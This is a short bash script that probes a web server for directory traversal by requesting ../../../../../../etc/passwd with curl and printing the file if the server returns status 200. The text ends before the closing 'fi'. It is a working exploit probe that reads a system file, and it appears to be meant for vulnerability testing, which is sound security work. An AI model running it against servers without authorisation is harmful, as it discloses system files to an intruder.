#!/bin/bash
# Script to test for directory traversal vulnerability

# Target web server and traversal path
TARGET="http://localhost"  # Replace with your target server address
TRAVERSAL_PATH="../../../../../../etc/passwd"

# Send the request and capture the HTTP response code
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$TRAVERSAL_PATH")
echo "Checked: $TARGET/$TRAVERSAL_PATH - Status code: $RESPONSE"

# Check if the response code indicates success
if [ "$RESPONSE" == "200" ]; then
    echo "Potential directory traversal vulnerability detected!"
    curl "$TARGET/$TRAVERSAL_PATH"
else
    echo "No directory traversal vulnerability detected."
